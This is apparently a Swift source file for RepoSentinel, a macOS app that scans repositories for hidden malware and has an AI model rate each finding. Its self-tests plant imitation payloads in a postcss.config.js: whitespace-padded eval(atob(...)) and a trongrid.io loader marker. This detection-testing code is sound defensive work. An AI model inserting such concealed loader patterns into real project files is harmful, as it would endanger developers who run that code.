import SwiftUI
import AppKit
import UniformTypeIdentifiers

@main
struct RepoSentinelApp: App {
    @StateObject private var engine = ScanEngine()
    @AppStorage(Pref.autoScan) private var autoScan = false

    init() {
        Pref.register()
        if CommandLine.arguments.contains("--selftest") { SelfTest.run() }
        if CommandLine.arguments.contains("--selftest-engine") { SelfTest.engine() }
    }

    var body: some Scene {
        WindowGroup("RepoSentinel") {
            MainView().environmentObject(engine).frame(minWidth: 1000, minHeight: 680)
                .task { if autoScan { engine.start() } }
        }
        .commands {
            CommandMenu("Scan") {
                Button("Run Checkup") { engine.start() }.keyboardShortcut("r").disabled(engine.isBusy)
                Button(engine.state == .paused ? "Resume" : "Pause") { engine.state == .paused ? engine.resume() : engine.pause() }
                    .keyboardShortcut("p", modifiers: [.command, .option]).disabled(!(engine.state == .running || engine.state == .paused))
                Button("Stop") { engine.stop() }.keyboardShortcut(".").disabled(!(engine.state == .running || engine.state == .paused))
                Button("Restart") { engine.restart() }.keyboardShortcut("r", modifiers: [.command, .shift]).disabled(engine.state == .idle)
                Divider()
                Button("Export Report (Markdown)…") { saveFile("RepoSentinel-report.md", engine.markdownReport().data(using: .utf8)!) }
                    .keyboardShortcut("e").disabled(engine.findings.isEmpty && engine.summary.isEmpty)
                Button("Export Report (JSON)…") { saveFile("RepoSentinel-report.json", engine.jsonReport()) }
                    .disabled(engine.findings.isEmpty && engine.summary.isEmpty)
            }
        }
        Settings { SettingsView().environmentObject(engine) }
    }
}

func saveFile(_ name: String, _ data: Data) {
    let p = NSSavePanel(); p.nameFieldStringValue = name
    if p.runModal() == .OK, let u = p.url { try? data.write(to: u) }
}

/// Headless check of the on-device model: `RepoSentinel --selftest`.
enum SelfTest {
    static func engine() { Task { @MainActor in await engineRun() } }
    static func run() {
        Task {
            print("AI:", AIService.availability() ?? "available")
            let ai = AIService(instructions: "")
            let bad = Finding(source: .local, target: "demo", file: "postcss.config.js", excerpt: "module.exports={};" + String(repeating: " ", count: 150) + "global['!']='8-1';var _$_1a2b=['trongrid.io'];eval(atob(x))", rule: "payload marker")
            let ok = Finding(source: .local, target: "demo", file: "package.json", excerpt: "\"scripts\": {\"dev\": \"next dev\"}", rule: "very long line (>500 chars)")
            for f in [bad, ok] {
                let v = await ai.verdict(for: f) { c in print("  call: \(c.inputTokens) in / \(c.outputTokens) out tokens, exact=\(c.exactTokens), \(String(format: "%.2f", c.seconds))s") }
                print(f.file, "->", v.level, "|", v.reason)
            }
            exit(0)
        }
    }

    /// Drives the real engine: scan a planted repo, pause/resume, stop, restart. `RS_NO_PERSIST=1` keeps history clean.
    @MainActor static func engineRun() async {
        let d = FileManager.default.temporaryDirectory.appendingPathComponent("rs-e2e-\(UUID().uuidString)")
        try? FileManager.default.createDirectory(at: d.appendingPathComponent("victim/.git"), withIntermediateDirectories: true)
        try? ("module.exports={};" + String(repeating: " ", count: 200) + "global['!']='8-1';require('https://api.trongrid.io')").write(to: d.appendingPathComponent("victim/postcss.config.js"), atomically: true, encoding: .utf8)
        for i in 0..<30 { try? FileManager.default.createDirectory(at: d.appendingPathComponent("clean\(i)/.git"), withIntermediateDirectories: true) }
        UserDefaults.standard.setVolatileDomain([Pref.roots: [d.path], Pref.scanRemote: false, Pref.scanMac: true, Pref.scanLocal: true, Pref.notify: false], forName: UserDefaults.argumentDomain)
        let e = ScanEngine()
        func wait(_ ok: () -> Bool) async { for _ in 0..<600 where !ok() { try? await Task.sleep(nanoseconds: 100_000_000) } }
        e.start(); print("started:", e.state)
        e.pause(); print("paused:", e.state); try? await Task.sleep(nanoseconds: 500_000_000)
        let frozen = e.log.count; try? await Task.sleep(nanoseconds: 500_000_000)
        print("log frozen while paused (in-flight excluded):", e.log.count - frozen <= 3)
        e.resume(); await wait { e.state == .finished }
        print("finished:", e.state, "| suspicious:", e.visible(.malicious).count, "| aiCalls:", e.aiCalls.count, "| tokens:", e.inputTokens, "/", e.outputTokens, "| log lines:", e.log.count)
        print("summary:", e.summary.prefix(160))
        print("stages:", e.stages.map { "\($0.id.rawValue)=\($0.state)" }.joined(separator: ", "))
        e.start(); try? await Task.sleep(nanoseconds: 30_000_000); e.stop(); await wait { e.state == .stopped }
        print("after stop:", e.state)
        e.restart(); await wait { e.state == .finished }; print("after restart:", e.state, "| suspicious:", e.visible(.malicious).count)
        try? FileManager.default.removeItem(at: d); exit(0)
    }
}
